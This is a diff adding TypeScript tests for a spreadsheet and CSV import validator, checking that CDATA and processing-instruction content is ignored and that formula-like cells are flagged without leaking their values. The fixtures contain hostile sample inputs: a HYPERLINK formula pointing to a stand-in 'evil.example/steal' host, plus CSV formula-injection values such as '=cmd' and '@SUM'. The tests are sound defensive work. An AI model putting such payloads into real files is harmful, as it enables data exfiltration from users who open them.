@@ -30,6 +30,7 @@ import {
   csvBytes,
   makeXlsx,
   misboundWorkbookContentTypesXml,
+  prefixedWorkbookContentTypesXml,
   sampleCsv,
   sampleXlsx,
   setZipEncryptionFlag,
@@ -754,6 +755,236 @@ describe("tabular validation", () => {
         declaredMimeType: XLSX_MIME,
       }),
     ).rejects.toMatchObject({ code: "type_mismatch" });
+
+    const prefixed = await validateTabularImport({
+      bytes: await makeXlsx({
+        sheets: [{ name: "Sheet1", rows: [["Name"], ["A"]] }],
+        contentTypesXml: prefixedWorkbookContentTypesXml(),
+      }),
+      filename: "prefixed-types.xlsx",
+      declaredMimeType: XLSX_MIME,
+    });
+    expect(prefixed.outcome).toBe("ready");
+    expect(prefixed.previewRows).toEqual([
+      { sourceRowNumber: 2, cells: ["A"] },
+    ]);
+
+    await expect(
+      validateTabularImport({
+        bytes: await makeXlsx({
+          sheets: [{ name: "Sheet1", rows: [["Name"], ["A"]] }],
+          contentTypesXml: prefixedWorkbookContentTypesXml({ misbound: true }),
+        }),
+        filename: "prefixed-misbound.xlsx",
+        declaredMimeType: XLSX_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "type_mismatch" });
+  });
+
+  it("ignores CDATA and processing-instruction OOXML payloads", async () => {
+    const fetchSpy = vi.spyOn(globalThis, "fetch");
+    const result = await validateTabularImport({
+      bytes: await makeXlsx({
+        sheets: [{ name: "Sheet1", rows: [["Name"], ["Widget"]] }],
+        extras: {
+          "xl/workbook.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <![CDATA[<sheet name="Evil" sheetId="99" r:id="rId99"/>]]>
+    <?pi <sheet name="EvilPi" sheetId="98" r:id="rId98"/> ?>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>`,
+          "xl/_rels/workbook.xml.rels": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <![CDATA[<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/evil.xml"/>]]>
+  <?pi <Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/evil-pi.xml"/> ?>
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+</Relationships>`,
+          "xl/sharedStrings.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="2">
+  <si><t>Name</t></si>
+  <![CDATA[<si><t>Attacker</t></si>]]>
+  <?pi <si><t>PiAttacker</t></si> ?>
+  <si><t><![CDATA[Widget]]></t></si>
+</sst>`,
+          "xl/worksheets/sheet1.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheetData>
+    <row r="1"><c r="A1" t="s"><v>0</v></c></row>
+    <![CDATA[<c r="A2" t="inlineStr"><is><t>Attacker</t></is></c>]]>
+    <?pi <c r="A2"><f>HYPERLINK("https://evil.example/steal","1")</f><v>1</v></c> ?>
+    <row r="2"><c r="A2" t="s"><v>1</v></c></row>
+  </sheetData>
+  <![CDATA[<hyperlink ref="A2" r:id="rId9"/>]]>
+  <?pi <mergeCell ref="A1:Z1"/> ?>
+  <![CDATA[<f>HYPERLINK("https://evil.example/steal","1")</f>]]>
+</worksheet>`,
+        },
+      }),
+      filename: "cdata-pi.xlsx",
+      declaredMimeType: XLSX_MIME,
+    });
+    expect(result.outcome).toBe("ready");
+    expect(result.sheets.map((sheet) => sheet.name)).toEqual(["Sheet1"]);
+    expect(result.previewRows).toEqual([
+      { sourceRowNumber: 2, cells: ["Widget"] },
+    ]);
+    expect(result.issues.map((item) => item.code)).toEqual([]);
+    expect(JSON.stringify(result)).not.toContain("Attacker");
+    expect(JSON.stringify(result.issues)).not.toContain("HYPERLINK");
+    expect(fetchSpy).not.toHaveBeenCalled();
+    fetchSpy.mockRestore();
+  });
+
+  it("does not flag numeric XLSX negatives while still classifying string prefixes", async () => {
+    const result = await validateTabularImport({
+      bytes: await makeXlsx({
+        sheets: [{ name: "Sheet1", rows: [["Name"]] }],
+        extras: {
+          "xl/sharedStrings.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="4" uniqueCount="4">
+  <si><t>Name</t></si>
+  <si><t>Shared</t></si>
+  <si><t>Inline</t></si>
+  <si><t>-12.5</t></si>
+</sst>`,
+          "xl/worksheets/sheet1.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="s"><v>0</v></c>
+      <c r="B1" t="s"><v>1</v></c>
+      <c r="C1" t="s"><v>2</v></c>
+    </row>
+    <row r="2">
+      <c r="A2" t="n"><v>-12.5</v></c>
+      <c r="B2" t="s"><v>3</v></c>
+      <c r="C2" t="inlineStr"><is><t>-12.5</t></is></c>
+    </row>
+  </sheetData>
+</worksheet>`,
+        },
+      }),
+      filename: "numeric-negative.xlsx",
+      declaredMimeType: XLSX_MIME,
+    });
+    expect(result.outcome).toBe("needs_attention");
+    expect(result.previewRows).toEqual([
+      { sourceRowNumber: 2, cells: ["-12.5", "-12.5", "-12.5"] },
+    ]);
+    expect(
+      result.issues.filter((item) => item.code === "formula_like"),
+    ).toEqual([
+      {
+        code: "formula_like",
+        severity: "warning",
+        sheetIndex: 0,
+        sheetName: "Sheet1",
+        row: 2,
+        column: 2,
+      },
+      {
+        code: "formula_like",
+        severity: "warning",
+        sheetIndex: 0,
+        sheetName: "Sheet1",
+        row: 2,
+        column: 3,
+      },
+    ]);
+    expect(JSON.stringify(result.issues)).not.toContain("-12.5");
+
+    const numericOnly = await validateTabularImport({
+      bytes: await makeXlsx({
+        sheets: [{ name: "Sheet1", rows: [["Amount"]] }],
+        extras: {
+          "xl/worksheets/sheet1.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1"><c r="A1" t="inlineStr"><is><t>Amount</t></is></c></row>
+    <row r="2"><c r="A2"><v>-12.5</v></c></row>
+  </sheetData>
+</worksheet>`,
+        },
+      }),
+      filename: "numeric-ready.xlsx",
+      declaredMimeType: XLSX_MIME,
+    });
+    expect(numericOnly.outcome).toBe("ready");
+    expect(numericOnly.previewRows).toEqual([
+      { sourceRowNumber: 2, cells: ["-12.5"] },
+    ]);
+    expect(numericOnly.issues).toEqual([]);
+  });
+
+  it("counts and classifies CSV extra-column fields without widening the preview", async () => {
+    const extraOk = await validateTabularImport({
+      bytes: csvBytes(extraColumnCsv(TABULAR_MAX_AGGREGATE_CHARS - 1)),
+      filename: "csv-extra-aggregate.csv",
+      declaredMimeType: CSV_MIME,
+    });
+    expect(extraOk.outcome).toBe("needs_attention");
+    expect(extraOk.issues.some((item) => item.code === "extra_columns")).toBe(
+      true,
+    );
+    expect(extraOk.previewRows[0]?.cells).toEqual([""]);
+    expect(extraOk.previewRows[0]?.cells).toHaveLength(1);
+    expect(extraOk.totalColumnCount).toBe(1);
+
+    await expect(
+      validateTabularImport({
+        bytes: csvBytes(extraColumnCsv(TABULAR_MAX_AGGREGATE_CHARS)),
+        filename: "csv-extra-aggregate-over.csv",
+        declaredMimeType: CSV_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "text_too_large" });
+
+    const log = vi.spyOn(console, "log").mockImplementation(() => undefined);
+    const info = vi.spyOn(console, "info").mockImplementation(() => undefined);
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
+    const error = vi
+      .spyOn(console, "error")
+      .mockImplementation(() => undefined);
+    const prefixes = await validateTabularImport({
+      bytes: csvBytes(
+        'Name\nWidget,=cmd\nGadget,+1+1\nOther,-2+3\nAt,@SUM\nTab,"\tsecret"\nCr,"\r-3"\nLf,"\n=1"\n',
+      ),
+      filename: "csv-extra-formulas.csv",
+      declaredMimeType: CSV_MIME,
+    });
+    expect(prefixes.outcome).toBe("needs_attention");
+    expect(prefixes.totalColumnCount).toBe(1);
+    expect(prefixes.previewRows.map((row) => row.cells)).toEqual([
+      ["Widget"],
+      ["Gadget"],
+      ["Other"],
+      ["At"],
+      ["Tab"],
+      ["Cr"],
+      ["Lf"],
+    ]);
+    expect(
+      prefixes.issues.filter((item) => item.code === "extra_columns"),
+    ).toHaveLength(7);
+    expect(
+      prefixes.issues.filter((item) => item.code === "formula_like"),
+    ).toHaveLength(7);
+    const serialized = JSON.stringify(prefixes.issues);
+    expect(serialized).not.toContain("=cmd");
+    expect(serialized).not.toContain("+1+1");
+    expect(serialized).not.toContain("-2+3");
+    expect(serialized).not.toContain("@SUM");
+    expect(serialized).not.toContain("secret");
+    for (const spy of [log, info, warn, error]) {
+      const output = spy.mock.calls.flat().map(String).join("\n");
+      expect(output).not.toContain("=cmd");
+      expect(output).not.toContain("secret");
+    }
+    log.mockRestore();
+    info.mockRestore();
+    warn.mockRestore();
+    error.mockRestore();
   });
 
   it("does not change PDF/DOCX/TXT document validation or Phase 4C offering validation", async () => {
@@ -808,6 +1039,12 @@ function columnARows(dataChars: number): string[][] {
 
 function extraColumnRows(extraChars: number): string[][] {
   return [["H"], ...chunkedCells(extraChars, (text) => ["", text])];
+}
+
+function extraColumnCsv(extraChars: number): string {
+  return `${extraColumnRows(extraChars)
+    .map((row) => row.join(","))
+    .join("\n")}\n`;
 }
 
 function chunkedCells(
